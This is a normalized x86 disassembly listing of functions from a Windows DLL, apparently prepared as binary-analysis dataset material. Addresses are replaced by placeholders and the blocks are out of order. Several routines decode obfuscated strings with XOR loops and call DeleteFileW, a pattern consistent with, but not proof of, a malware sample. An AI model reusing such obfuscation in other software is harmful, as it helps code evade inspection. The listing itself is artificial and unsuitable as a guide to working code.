mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_10057da0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086eb1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
add edi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] edi
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_1002d970
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov edi [ ebp + 0x8 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0xc ]
je r-xdata
sub_10057e2d
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_100603e0
add esi 0x24
cmp esi edi
jne r-xdata
sub_10057e60
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x10
add ecx 0x18
mov [ ebp - 0x14 ] ecx
mov [ edi ] al
add esi 0x2
inc edi
cmp esi ebx
jne r-xdata
mov al [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
movzx eax [ esi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x10 ] 0x0
call sub_10063545
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0x10 ]
jne r-xdata
sub_10057eeb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_100650d7
dec [ ebp + 0x1c ]
jne r-xdata
sub_10057f20
push ebp
mov ebp esp
push 0xffffffff
push sub_10087d63
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xb8 ] r--data
mov [ ebp - 0xa8 ] r--data
mov [ ebp - 0x58 ] r--data
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
push ecx
mov [ ebp - 0x10 ] 0x2
call sub_10060120
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp - 0xb8 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xa0 ]
push ecx
mov [ ebp + eax - 0xb8 ] r--data
call sub_10037c00
mov [ ebp - 0xa0 ] r--data
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x60 ] ebx
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0xa8 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10056900
mov ecx esi
lea eax [ ebp - 0xb8 ]
call sub_10047270
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x10 ] 0x3
mov [ ebp - 0x4 ] bl
call sub_1006d490
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10058020
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100033b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10058041
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100660cf
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10058070
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x2
cdq
push esi
sub eax edx
sar eax 0x1
push edi
lea edi [ ebx + eax * 4 ]
mov eax [ ebp + 0x14 ]
push eax
add ecx 0xfffffffc
push ecx
mov esi ebx
call sub_1003d090
add esp 0x8
lea esi [ edi + 0x4 ]
mov [ ebp - 0x4 ] esi
cmp ebx edi
jae r-xdata
cmp esi [ ebp + 0x10 ]
jae r-xdata
lea ebx [ ebx ]
mov ebx edi
mov edi edi
mov edi edi
mov eax [ edi - 0x4 ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
cmp ebx [ ebp + 0xc ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ esi ]
mov edx [ edi ]
push ecx
push edx
call ebx
add esp 0x8
test eax eax
jne r-xdata
add edi 0xfffffffc
cmp ebx edi
jb r-xdata
jne r-xdata
mov eax [ edi ]
mov ecx [ ebx - 0x4 ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov edx [ edi ]
mov eax [ esi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ edi ]
mov edx [ edi - 0x4 ]
push ecx
push edx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
sub ebx 0x4
cmp esi [ ebp + 0x10 ]
jne r-xdata
cmp esi [ ebp + 0x10 ]
je r-xdata
add ebx 0xfffffffc
cmp [ ebp + 0xc ] ebx
jb r-xdata
mov edx [ ebx - 0x4 ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ esi ]
mov eax ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
mov [ eax ] edx
mov [ esi ] ecx
mov edx [ edi ]
mov eax [ esi ]
mov ebx [ ebp + 0x14 ]
push edx
push eax
call ebx
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] eax
add esi 0x4
jmp r-xdata
sub edi 0x4
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax esi
je r-xdata
cmp ebx [ ebp + 0xc ]
mov ecx [ ebx - 0x4 ]
mov eax [ edi - 0x4 ]
sub edi 0x4
mov [ edi ] ecx
mov [ ebx - 0x4 ] eax
cmp esi [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax - 0x4 ]
mov ecx [ edi ]
sub eax 0x4
mov [ edi ] edx
mov [ ebp - 0x4 ] eax
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov ecx edi
mov edx [ ecx ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax esi
mov [ ebp - 0x8 ] edx
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
add edi 0x4
add esi 0x4
mov [ eax ] ecx
jmp r-xdata
mov edx [ eax ]
mov ecx [ edi ]
mov [ edi ] edx
mov [ eax ] ecx
sub_10058219
push 0x34
mov eax sub_10085c22
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_10032181
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_10032181
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003a92d
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_10023cd6
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_1001339a
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10069470
mov eax [ ebp - 0x30 ]
call sub_100262c3
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002f56c
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_100582f0
push 0x10
push r--data
call sub_1007fad0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb15
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1005fd8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10039f2f
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100583bc
mov eax [ ebp - 0x1c ]
sub_100583d0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_10058423
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100820ac
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10058470
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x14 ]
test eax eax
js r-xdata
push edi
push 0x30
push esi
call sub_10013bb0
mov edx [ esi + 0x4 ]
add edx 0x8
push edx
mov edi eax
push edi
push esi
call sub_10006860
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0xc ] eax
jb r-xdata
xor eax eax
pop esi
pop ebp
retn
sub_100584b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a460
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3e8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3e0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x3f8 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
mov [ esp + 0x1c ] ebx
cmp [ ebx + 0x8 ] edi
jne r-xdata
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
add ebx 0xb4
mov [ esp + 0x400 ] edi
mov esi [ ebx ]
mov ecx [ ebx + 0x4 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebx
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax ebx
mov ebx [ esp + 0x1c ]
mov ecx ebx
lea esi [ esp + 0x3c ]
call sub_1001fb40
mov [ esp + 0x400 ] 0x2
mov ecx [ r--data ]
mov [ esp + 0x20 ] edi
mov [ esp + 0x34 ] edi
xor eax eax
xor edi edi
mov [ esp + 0x14 ] edi
mov ecx [ esp + 0x3f8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3e0 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x55
and edx 0xff
mov [ esp + eax * 2 + 0x194 ] dx
inc eax
cmp eax 0x25
jb r-xdata
lea ecx [ esp + 0x194 ]
push ecx
lea edx [ esp + 0xbc ]
xor eax eax
add ebx 0xc
push edx
mov [ esp + 0x1e6 ] ax
mov [ esp + 0x18 ] ebx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xb
mov [ esp + 0x400 ] 0x3
call sub_10022b50
mov [ esp + 0x400 ] 0x2
cmp [ esp + 0xcc ] 0x8
jb r-xdata
lea edx [ esp + 0xb4 ]
push edx
lea ecx [ esp + 0xb4 ]
push ecx
call sub_100505a0
add esp 0x8
lea ecx [ esp + 0x94 ]
lea edi [ esp + 0x24 ]
call sub_1006dc90
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov eax [ eax ]
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x3c ]
lea edi [ esp + 0x2c ]
call sub_100017a0
test eax eax
je r-xdata
mov eax [ esp + 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
mov esi [ ebx ]
mov ecx [ ebx + 0x4 ]
mov edi [ esp + 0x14 ]
inc [ esp + 0x10 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edi 0x1c
add eax edx
mov [ esp + 0x14 ] edi
cmp [ esp + 0x10 ] eax
jb r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x34 ]
cmp eax 0x1e84800
jge r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
xor ecx ecx
mov [ esp + 0xa8 ] 0x7
mov [ esp + 0xa4 ] eax
mov [ esp + 0x94 ] cx
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
push 0xffffffff
push eax
add esi edi
push esi
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x40c ] 0x1
call sub_1002d970
xor eax eax
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
mov eax [ ebx ]
add eax edi
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
xor edi edi
lea edx [ esp + 0x38 ]
mov eax 0x114
call sub_10069020
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x1fc ]
mov [ esp + 0x2c ] 0x1
call sub_1005bf30
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10003660
mov esi eax
test esi esi
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x5c
and edx 0xff
mov [ esp + eax * 2 + 0x11c ] dx
inc eax
cmp eax 0x39
jb r-xdata
mov eax [ esp + 0x20 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x20 ]
push edx
push eax
lea eax [ esp + 0x1ec ]
call sub_1002f360
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x20 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x11c ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0x98 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x10 ]
lea eax [ esp + 0x11c ]
push eax
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0x408 ] 0x5
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xd4 ]
mov [ esp + 0x400 ] 0x6
call sub_1006b070
mov ebx 0x7
mov edx eax
lea ecx [ ebx + 0x4 ]
mov [ esp + 0x400 ] bl
call sub_10022b50
mov esi 0x8
cmp [ esp + 0xe8 ] esi
jb r-xdata
lea ecx [ esp + 0x11c ]
push ecx
lea edx [ esp + 0xbc ]
xor eax eax
push edx
mov [ esp + 0x196 ] ax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xb
mov [ esp + 0x400 ] 0x4
call sub_10022b50
cmp [ esp + 0xcc ] 0x8
jb r-xdata
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
xor edi edi
xor eax eax
mov [ esp + 0xe8 ] ebx
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] ax
cmp [ esp + 0xcc ] esi
jb r-xdata
mov edx [ esp + 0xd4 ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ esp + 0x3c ]
mov [ esp + 0x400 ] 0x0
call sub_10054bf0
mov esi [ esp + 0x24 ]
test esi esi
je r-xdata
mov eax [ esp + 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x18 ]
mov esi [ eax ]
mov edi [ esp + 0x1c ]
mov ebx [ DeleteFileW@IAT ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov edi edi
mov edi [ esp + 0x18 ]
mov esi [ edi ]
mov edx [ esp + 0x1c ]
cmp esi [ edx + 0xb8 ]
je r-xdata
lea esp [ esp ]
xor edx edx
mov [ esp + 0xcc ] ebx
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] dx
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov ecx [ esp + 0xb8 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
lea esp [ esp ]
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
cmp eax ecx
je r-xdata
mov ebx [ DeleteFileW@IAT ]
lea esp [ esp ]
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
lea eax [ esp + 0x3c ]
mov [ esp + 0x400 ] 0x0
call sub_10054bf0
mov esi [ esp + 0x24 ]
cmp esi edi
je r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ esp + 0x14 ]
push edx
push ecx
call sub_1006cad0
mov ebx eax
mov eax [ esp + 0x20 ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
mov edx [ esp + 0x14 ]
push edx
push ecx
call sub_1006cad0
mov edi [ edi + 0x4 ]
mov ebx eax
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
lea edx [ esp + 0x1e4 ]
push edx
call sub_10050cb0
mov esi eax
lea eax [ esp + 0x1e4 ]
push eax
call ebx
xor eax eax
test esi esi
je r-xdata
mov ecx [ r--data ]
xor eax eax
nop
mov edx [ esp + 0x18 ]
mov [ edx + 0x4 ] ebx
mov ebx [ DeleteFileW@IAT ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x18 ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa5
and edx 0xff
mov [ esp + eax * 2 + 0xf0 ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0xf0 ]
push ecx
lea edx [ esp + 0x98 ]
xor eax eax
push edx
mov [ esp + 0x120 ] ax
call sub_10029ef0
add esp 0x8
mov [ esp + 0x400 ] 0x8
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx + 0x4 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call ebx
mov eax [ esp + 0x1c ]
add esi 0x1c
cmp esi [ eax + 0xb8 ]
jne r-xdata
mov ecx [ r--data ]
mov ecx [ r--data ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7e
and edx 0xff
mov [ esp + eax * 2 + 0x11c ] dx
inc eax
cmp eax 0x3b
jb r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
push ecx
lea esi [ esp + 0x98 ]
mov [ esp + 0x196 ] ax
call sub_1001ddf0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x10 ]
lea edx [ esp + 0x11c ]
push edx
lea eax [ esp + 0xd8 ]
push eax
mov [ esp + 0x408 ] 0x9
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xb8 ]
mov [ esp + 0x400 ] 0xa
call sub_1006b070
mov ecx 0xb
mov edx eax
mov [ esp + 0x400 ] cl
call sub_10022b50
cmp [ esp + 0xcc ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov edx eax
mov ecx 0xb
call sub_10022b50
cmp [ esp + 0xa8 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa5
and edx 0xff
mov [ esp + eax * 2 + 0xf0 ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0xf0 ]
push ecx
lea edx [ esp + 0x98 ]
xor eax eax
push edx
mov [ esp + 0x120 ] ax
call sub_10029ef0
add esp 0x8
mov [ esp + 0x400 ] 0xf
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7e
and edx 0xff
mov [ esp + eax * 2 + 0x11c ] dx
inc eax
cmp eax 0x3b
jb r-xdata
xor eax eax
push esi
lea esi [ esp + 0x98 ]
mov [ esp + 0x196 ] ax
call sub_1001ddf0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0x11c ]
push ecx
lea edx [ esp + 0xd8 ]
push edx
mov [ esp + 0x408 ] 0xc
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xb8 ]
mov [ esp + 0x400 ] 0xd
call sub_1006b070
mov edx eax
mov ecx 0xb
mov [ esp + 0x400 ] 0xe
call sub_10022b50
cmp [ esp + 0xcc ] 0x8
jb r-xdata
xor edi edi
xor edx edx
mov ebx 0x8
mov esi 0x7
mov [ esp + 0xcc ] esi
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] dx
cmp [ esp + 0xe8 ] ebx
jb r-xdata
mov ecx [ esp + 0xb8 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ esp + 0x400 ] 0x0
mov eax [ esp + 0x3c ]
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
xor edi edi
xor ecx ecx
mov esi 0x8
mov ebx 0x7
mov [ esp + 0xcc ] ebx
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] cx
cmp [ esp + 0xe8 ] esi
jb r-xdata
mov eax [ esp + 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esp + 0xe8 ] esi
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] cx
cmp [ esp + 0xa8 ] ebx
jb r-xdata
mov eax [ esp + 0xd4 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call edi
xor eax eax
mov [ esp + 0xe8 ] ebx
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] ax
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov edx [ esp + 0xd4 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ esp + 0x400 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esp + 0x400 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
cmp eax edi
je r-xdata
mov ecx [ esp + 0x94 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x44 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esp + 0x44 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
cmp eax edi
je r-xdata
push eax
